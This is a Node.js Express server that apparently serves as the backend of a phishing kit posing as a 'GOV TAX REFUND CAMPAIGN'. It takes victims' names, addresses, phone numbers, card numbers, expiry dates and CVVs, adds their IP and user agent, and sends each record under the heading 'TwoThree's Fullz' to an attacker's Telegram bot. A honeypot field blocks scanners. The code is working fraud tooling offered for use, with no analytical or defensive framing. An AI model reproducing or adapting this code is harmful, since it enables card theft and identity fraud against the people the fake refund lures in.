import dotenv from 'dotenv';
import express from 'express';
import rateLimit from "express-rate-limit";
import cors from 'cors';
dotenv.config()

const app = express();
app.set("trust proxy", 1);
app.use(cors());
app.use(express.json());

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const blockedIps = new Set();

const formLimiter = rateLimit({
    windowMs: 60 * 1000, // 1 minute
    max: 3, 
  });

app.post("/submit-form", formLimiter, async (req, res) => {
    const { firstName, lastName, phoneNum, address, city, postcode, cardNum, expiry, cvv } = req.body;
  
    const userAgent = req.headers['user-agent'];

    const xForwardedFor = req.headers['x-forwarded-for'];
    let ip;

  if (Array.isArray(xForwardedFor)) {
    ip = xForwardedFor[0].split(',')[0].trim();
} else if (typeof xForwardedFor === 'string') {
  ip = xForwardedFor.split(',')[0].trim();
} else {
  ip = req.socket.remoteAddress || "Unknown";
}

if (req.body.phone_number) {
// block IP for 1 hour
    blockedIps.add(ip);
    setTimeout(() => blockedIps.delete(ip), 3600000);
  }

    const text = `
  -------- TwoThree's Fullz --------
  GOV TAX REFUND CAMPAIGN:

  First Name: ${firstName}
  Last Name: ${lastName}
  Phone num: ${phoneNum}
  Address: ${address}
  City ${city}
  Post code: ${postcode}
  Card Number: ${cardNum}
  expiry: ${expiry}
  cvv: ${cvv}
  IP: ${ip}
  User Agent: ${userAgent}
    `;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text,
        }),
      });
    
      res.json({ success: true });
    });
    

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
